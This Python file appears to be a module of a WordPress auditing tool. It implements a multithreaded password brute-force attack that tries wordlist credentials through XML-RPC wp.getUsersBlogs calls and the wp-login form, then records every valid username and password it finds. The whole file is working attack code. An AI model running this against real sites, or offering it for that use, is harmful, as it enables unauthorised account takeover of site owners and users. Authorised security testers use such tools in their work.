from modules import ModuleBase
from main import WP_Audit
from libs.logger import Logger
from concurrent.futures import ThreadPoolExecutor
import time

class Module(ModuleBase):
    def __init__(self, wp_audit_instance: WP_Audit):
        super().__init__(wp_audit_instance)
        self.priority = 5
        self.name = "WP Brute Force"
        self.description = "A module to brute force WordPress user credentials."
        self.version = "1.0"
        self.author = "Serializer"
        self.enabled = True if self.wp_audit.bruteforce != None else False
        self.logger = Logger(moduleName=self.name)
    
        self.found_credentials = []
        self.login_url = None
        self.attempt_count = 0
        self.success_count = 0

    def get_login_url(self) -> str:
        common_paths = [
            "/wp-login",
            "/wp-admin/",
            "/login/",
            "/user-login/",
        ]
        
        for path in common_paths:
            url = self.target_url + path
            try:
                response = self.session.get(url=url)
                if response.status_code == 200 and ("wp-login" in response.text or "WordPress" in response.text):
                    self.logger.found(f"Found login page at {url}")
                    return url
            except Exception:
                continue
        
        return self.target_url + "/wp-login.php"

    def test_credentials_xmlrpc(self, username: str, password: str) -> bool:
        xmlrpc_url = self.target_url + "/xmlrpc.php"
        
        payload = f"""
<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>
        """
        
        try:
            response = self.session.post(
                url=xmlrpc_url,
                data=payload,
                headers={"Content-Type": "application/xml"}
            )
            self.attempt_count += 1
            
            if "faultCode" not in response.text and response.status_code == 200:
                self.logger.found(f"Valid credentials found: {username}:{password} (via XML-RPC)")
                self.found_credentials.append({
                    "username": username,
                    "password": password,
                    "method": "xmlrpc"
                })
                self.success_count += 1
                return True
            else:
                self.logger.warning(f" - Invalid password: {username}:{password} (via XML-RPC)")
        except Exception as e:
            self.logger.error(f"Error testing credentials via XML-RPC: {e}")
        
        return False

    def test_credentials_login(self, username: str, password: str) -> bool:
        if not self.login_url:
            return False
        
        try:
            self.session.get(url=self.login_url)
            
            login_data = {
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self.target_url + "/wp-admin/",
                "testcookie": "1"
            }
            
            response = self.session.post(
                url=self.login_url,
                data=login_data,
                allow_redirects=False
            )
            self.attempt_count += 1
            
            if response.status_code == 302 and "wp-admin" in response.headers.get("Location", ""):
                self.logger.found(f"Valid credentials found: {username}:{password} (via login form)")
                self.found_credentials.append({
                    "username": username,
                    "password": password,
                    "method": "login_form"
                })
                self.success_count += 1
                return True
            else:
                self.logger.warning(f" - Invalid password: {username}:{password} (via login form)")
            
        except Exception as e:
            self.logger.error(f"Error testing credentials via login form: {e}")
        
        return False

    def test_credentials(self, username: str, password: str) -> bool:
        if self.test_credentials_xmlrpc(username, password):
            return True
        
        return self.test_credentials_login(username, password)

    def run(self):
        if not self.enabled:
            return

        self.logger.info(f"Running {self.name} on {self.target_url}")

        mode = str(self.wp_audit.bruteforce).lower()

        if mode == "enum":
            self.logger.info(f"Module {self.name} is waiting for wp_users enumerations")
            while len(self.wp_audit.gathered_informations.get("wp_users", [])) < 1:
                pass

        usernames = ["admin"] if mode == "admin" else [
            u["slug"] for u in self.wp_audit.gathered_informations.get("wp_users", [])
        ]

        try:
            with open('./data/passwords.fuzz', 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
        except FileNotFoundError:
            self.logger.error("Could not find ./data/passwords.fuzz")
            return

        self.login_url = self.get_login_url()
        self.logger.info(f"Using login URL: {self.login_url}")

        credentials = []
        for username in usernames:
            for password in passwords:
                credentials.append((username, password.replace('%slug%', username)))

        self.logger.info(f"Starting brute force attack with {len(credentials)} (usernames: {len(usernames)}, passwords: {len(passwords)}) possible credential(s)")

        with ThreadPoolExecutor(max_workers=self.wp_audit.threads) as ex:
            ex.map(lambda creds: self.test_credentials(creds[0], creds[1]), credentials)

        self.logger.info(f"Brute force completed: {self.attempt_count} attempts, {self.success_count} successful")

        if self.found_credentials:
            self.wp_audit.gathered_informations.setdefault("wp_credentials", []).extend(self.found_credentials)
            self.logger.warning(f"Found {len(self.found_credentials)} valid credentials")
        else:
            self.logger.warning("No valid credentials found")